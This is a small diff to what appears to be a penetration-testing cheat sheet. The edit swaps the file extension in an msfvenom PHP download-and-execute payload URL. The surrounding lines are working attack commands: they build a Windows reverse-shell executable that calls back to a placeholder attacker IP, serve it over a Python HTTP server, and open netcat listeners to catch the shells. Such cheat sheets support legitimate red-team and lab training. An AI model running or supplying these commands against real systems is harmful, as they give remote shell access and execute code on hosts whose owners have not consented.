@@ -390,7 +390,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=4444 -f exe -o she
 nc -lvnp 4444
 
 # PHP Download Execute
-msfvenom -p php/download_exec URL=http://MYIPADDRESS/shell.elf -f raw -o shell.php
+msfvenom -p php/download_exec URL=http://MYIPADDRESS/shell.exe -f raw -o shell.php
 msfvenom -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f exe -o shell.exe
 python -m SimpleHTTPServer 80
 nc -lvnp 443
